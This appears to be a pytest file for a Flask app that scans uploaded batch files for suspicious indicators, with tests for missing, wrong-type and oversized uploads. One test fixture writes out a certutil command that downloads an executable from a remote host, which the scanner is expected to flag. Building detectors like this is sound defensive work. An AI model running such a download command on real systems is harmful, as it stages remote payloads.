import io

from app import app


def test_index_get_shows_upload_form():
    client = app.test_client()
    response = client.get("/")
    assert response.status_code == 200
    assert b'type="file"' in response.data


def test_post_with_no_file_shows_error():
    client = app.test_client()
    response = client.post("/", data={}, content_type="multipart/form-data")
    assert response.status_code == 200
    assert b"choose a file" in response.data.lower()


def test_post_with_unsupported_extension_shows_error():
    client = app.test_client()
    data = {"file": (io.BytesIO(b"hello"), "notes.txt")}
    response = client.post("/", data=data, content_type="multipart/form-data")
    assert response.status_code == 200
    assert b"unsupported file type" in response.data.lower()


def test_post_with_oversized_file_shows_error():
    client = app.test_client()
    big_content = b"@echo off\n" + b"echo hi\n" * 2_000_000  # well over 10MB
    data = {"file": (io.BytesIO(big_content), "big.bat")}
    response = client.post("/", data=data, content_type="multipart/form-data")
    assert response.status_code == 200
    assert b"too large" in response.data.lower()


def test_post_with_clean_bat_shows_no_indicators():
    client = app.test_client()
    data = {"file": (io.BytesIO(b"@echo off\necho hello\n"), "clean.bat")}
    response = client.post("/", data=data, content_type="multipart/form-data")
    assert response.status_code == 200
    assert b"no suspicious indicators found" in response.data.lower()


def test_post_with_suspicious_bat_shows_indicators():
    client = app.test_client()
    content = b"@echo off\ncertutil -urlcache -f http://example.com/a.exe a.exe\n"
    data = {"file": (io.BytesIO(content), "rigged.bat")}
    response = client.post("/", data=data, content_type="multipart/form-data")
    assert response.status_code == 200
    assert b"suspicious indicator" in response.data.lower()
    assert b"certutil" in response.data.lower()
